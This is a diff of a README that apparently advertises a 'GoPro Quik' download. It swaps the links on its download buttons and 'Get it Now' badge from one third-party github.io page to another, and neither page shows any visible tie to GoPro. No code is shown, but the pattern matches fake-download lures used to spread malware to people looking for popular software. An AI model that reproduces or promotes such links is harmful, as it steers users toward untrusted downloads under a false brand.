@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://urinoterapia-sigma.github.io/.github/goProQuik">
+  <a href="https://six-sevens.github.io/.github/goProQuik">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download GoPro Quik"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ The GoPro ecosystem integration distinguishes Quik from generic video managers a
 
 <p align="center">
 
-[![Get it Now GoPro Quik](https://img.shields.io/badge/Get_it_Now-1B998B?style=for-the-badge&logo=apple&logoColor=white)](https://urinoterapia-sigma.github.io/.github/goProQuik)
+[![Get it Now GoPro Quik](https://img.shields.io/badge/Get_it_Now-1B998B?style=for-the-badge&logo=apple&logoColor=white)](https://six-sevens.github.io/.github/goProQuik)
 
 </p>
 
